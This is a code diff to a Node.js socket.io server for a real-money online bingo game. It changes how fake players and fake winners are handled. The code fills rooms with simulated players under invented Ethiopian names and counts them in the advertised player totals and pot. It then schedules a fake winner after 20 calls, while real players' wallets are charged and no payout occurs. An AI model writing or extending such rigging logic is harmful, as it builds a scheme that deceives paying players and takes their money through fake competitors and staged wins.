@@ -7,7 +7,7 @@ const cors = require('cors');
 const { generateBalls } = require('./src/helpers/ball');
 const { checkBingo, markPlayerCard } = require('./src/helpers/bingo');
 const { checkSingleCardBingo } = require('./src/helpers/singleBingo');
-const { gameWinWallet,gameLossWallet,updateLastGame,getGameSettings } = require('./api');
+const { gameWinWallet,gameLossWallet,updateLastGame,getGameSettings, updateGameMetrics } = require('./api');
 const ip = require('ip');
 const dotenv = require('dotenv');
 dotenv.config();
@@ -18,8 +18,8 @@ const server = http.createServer(app);
 
 const getConstant = async () => {
   return {
-    gameSpeed: 4000,
-    countDown: 10
+    gameSpeed: 3000,
+    countDown: 5
   }
 }
 
@@ -34,6 +34,9 @@ const io = socketIo(server, {
     skipMiddlewares: true
   }
 });
+
+// ---------------- Utility helpers (non-breaking) ----------------
+const { computeTotals, emitGameState } = require('./src/helpers/serverHelpers');
 
 // Ethiopian fake user names (first and last) for realistic winner announcements
 const ETH_FIRST_NAMES = [
@@ -191,21 +194,7 @@ function startCountDown(game) {
           console.log(`[FAKE_SIM] ADD room=${game.roomId} gameId=${game.id} chosen=${JSON.stringify(chosenList)} total=${game.selectedNumbers.filter(n=>n!==null).length}`);
           io.emit('pickedNumbers', { roomId: game.roomId, numbers: game.selectedNumbers });
           console.log(`[FAKE_SIM] EMIT pickedNumbers room=${game.roomId} count=${game.selectedNumbers.length}`);
-          // Update totals to include fake selections
-          game.total_players = game.selectedNumbers.filter(n => n !== null).length;
-          game.win_amount = game.total_players * game.roomId * 0.78;
-
-          io.emit('gameState', {
-            gameId: game.id,
-            roomId: game.roomId,
-            pickedNumbers: game.selectedNumbers,
-            game_status: game.status,
-            count_down: game.countDown,
-            total_players: game.total_players,
-            win_amount: game.total_winAmount,
-            total_winAmount: game.total_winAmount,
-          });
-          console.log(`[FAKE_SIM] EMIT gameState room=${game.roomId} total_players=${game.selectedNumbers.filter(n => n !== null).length} count_down=${game.countDown}`);
+          // Totals and consolidated gameState will be emitted below once per tick
         }
       }
     } else {
@@ -252,14 +241,12 @@ function startCountDown(game) {
           roomId: game.roomId,
           pickedNumbers: game.selectedNumbers.filter(num => num !== null),
           total_players: game.selectedNumbers.filter(num => num !== null).length,
+          
           game_status: game.status,
           count_down: game.countDown
         });
         
-        io.emit("globals", {
-          roomId: game.roomId,
-          countDown: game.countDown
-        });
+      
         
         return;
       }
@@ -271,8 +258,18 @@ function startCountDown(game) {
       game.currentCall = null;
       game.calledNumbers = [];
       game.selectedNumbers = game.selectedNumbers.filter(num => num !== null);
-      game.win_amount = game.roomId * game.players.size * 0.78
-      game.total_players = game.players.size
+
+      // Freeze metrics at start (include fakes)
+      const realPlayersAtStart = game.players ? game.players.size : 0;
+      const totalPlayersAtStart = game.selectedNumbers.length;
+      const fakePlayersAtStart = Math.max(0, totalPlayersAtStart - realPlayersAtStart);
+      const winAmountAtStart = totalPlayersAtStart * game.roomId * 0.78;
+
+      game.total_players = totalPlayersAtStart;
+      game.total_winAmount = winAmountAtStart;
+      game.win_amount = winAmountAtStart;
+
+     
       startGame(game);
     }
     game.countDown--;
@@ -314,7 +311,16 @@ async function startGame(game) {
   game.total_winAmount = game.selectedNumbers.length * game.roomId * 0.78
 
   try {
-    await gameLossWallet(players, game.id, game.total_players);
+    await gameLossWallet(players, game.id, game.total_players, game.fake_players);
+    
+    // Calculate number of fake players (assuming fake players fill up to 50 total, rest are real)
+    const maxPlayers = 50;
+    const realPlayers = game.total_players;
+    const fakePlayers = Math.max(0, maxPlayers - realPlayers);
+    game.fake_players = fakePlayers;
+
+    updateGameMetrics(game.roomId, realPlayers, fakePlayers, realPlayers, game.total_winAmount);
+
   } catch (error) {
     console.error('Error charging players:', error);
   }
@@ -323,7 +329,7 @@ async function startGame(game) {
 
  
 
-  const gameInterval = setInterval(() => {
+  const gameInterval = setInterval(async () => {
     const calledSet = new Set(game.calledNumbers.map(b => b.number));
     let ball = generateBalls();
     while (calledSet.has(ball.number)) {
@@ -335,8 +341,8 @@ async function startGame(game) {
     io.emit("pickedNumbers", { roomId: game.roomId, numbers: game.selectedNumbers });
   
     // Schedule a fake winner once at least 10 numbers have been called
-    if (!game.fakeWinnerScheduled && game.calledNumbers.length >= 10) {
-      scheduleFakeWinner(game);
+    if (!game.fakeWinnerScheduled && game.calledNumbers.length >= 20) {
+      await scheduleFakeWinner(game);
     }
 
     io.emit("gameState", {
@@ -421,7 +427,8 @@ function generateFakeWinningCard() {
   return grid;
 }
 
-function scheduleFakeWinner(game) {
+async function scheduleFakeWinner(game) {
+  console.log("scheduleFakeWinner calledNumbers.length = ", game.calledNumbers.length)
   try {
     game.fakeWinnerScheduled = true;
     const delayMs = 5000 + Math.floor(Math.random() * 15000); // 5-20 seconds
@@ -449,6 +456,25 @@ function scheduleFakeWinner(game) {
           gameId: g.id,
           roomId: g.roomId
         });
+
+        // Persist metrics at fakw win moment and mark backend ended
+        try {
+          const realPlayers = g.players ? g.players.size : 0;
+          const totalPlayers = (g.selectedNumbers || []).filter(n => n !== null).length;
+          const fakePlayers = Math.max(0, totalPlayers - realPlayers);
+          const winAmount = totalPlayers * g.roomId * 0.78;
+          g.total_players = totalPlayers;
+          g.total_winAmount = winAmount;
+          g.win_amount = winAmount;
+          // Persist to backend and end last game (no wallet ops for fake winners)
+          updateGameMetrics(g.roomId, realPlayers, fakePlayers, totalPlayers, winAmount);
+          updateLastGame(g.roomId);
+          console.log(`[END_GAME][FAKE_WIN] room=${g.roomId} real=${realPlayers} fake=${fakePlayers} total=${totalPlayers} win=${winAmount}`);
+        } catch (e) {
+          console.log('[METRICS][FAKE_WIN] error', e?.message || e);
+        }
+
+      
 
         // End the game after announcing fake winner (no wallet ops for fake)
         endGame(g);
@@ -550,12 +576,8 @@ io.on('connection', (socket) => {
     }
 
     game.selectedNumbers.push(data.selectedNumber)
-    game.selectedNumbers.push(data.selectedNumber2)
-
-    
+    game.selectedNumbers.push(data.selectedNumber2)    
     game.selectedNumbersToPlayer.set(data.playerId, [data.selectedNumber, data.selectedNumber2])
-
-
     game.numberOfBoardsToPlayer.set(data.playerId,data.numberOfBoards)
     io.emit("pickedNumbers", { roomId: game.roomId, numbers: game.selectedNumbers });
     if (game.players && game.players.size >= 100) {
@@ -659,6 +681,8 @@ io.on('connection', (socket) => {
         gameId: data.gameId,
         roomId: data.roomId
       })
+
+    
 
       try {
         const response = await gameWinWallet(
